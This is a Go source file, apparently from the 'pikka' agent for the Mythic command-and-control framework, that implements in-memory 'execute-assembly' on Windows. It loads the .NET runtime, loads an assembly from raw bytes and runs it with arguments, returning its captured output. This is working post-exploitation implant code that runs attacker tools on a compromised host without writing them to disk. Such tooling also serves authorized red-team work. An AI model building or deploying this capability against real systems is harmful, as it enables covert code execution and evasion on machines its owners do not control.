//go:build windows

package execute_assembly

import (
	// Standard

	"fmt"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils"

	clr "github.com/Ne0nd0g/go-clr"
)

func executeAssembly(exebytes []byte, args []string) (string, string) {
	// TODO: i need to change this method because go-clr has some issues
	// LoadCLR:  works only on second attempt, why?

	// actual implementation taken from -> https://github.com/Ne0nd0g/go-clr/blob/master/examples/EXEfromMemory/EXEfromMemory.go

	err := clr.RedirectStdoutStderr()
	if err != nil {
		return "", fmt.Sprintf("Error redirecting stdout/stderr: %s", err)
	}

	utils.PrintDebug("Loading CLR")
	runtimeHost, err := clr.LoadCLR("v4")
	if err != nil {
		return "", fmt.Sprintf("error loading CLR: %s", err)
	}

	utils.PrintDebug("Loading assembly")
	methodInfo, err := clr.LoadAssembly(runtimeHost, exebytes)
	if err != nil {
		return "", fmt.Sprintf("error loading assembly: %s", err)
	}

	utils.PrintDebug("Invoking assembly")
	stdout, stderr := clr.InvokeAssembly(methodInfo, args)
	utils.PrintDebug("STDOUT: " + stdout)

	return stdout, stderr
}
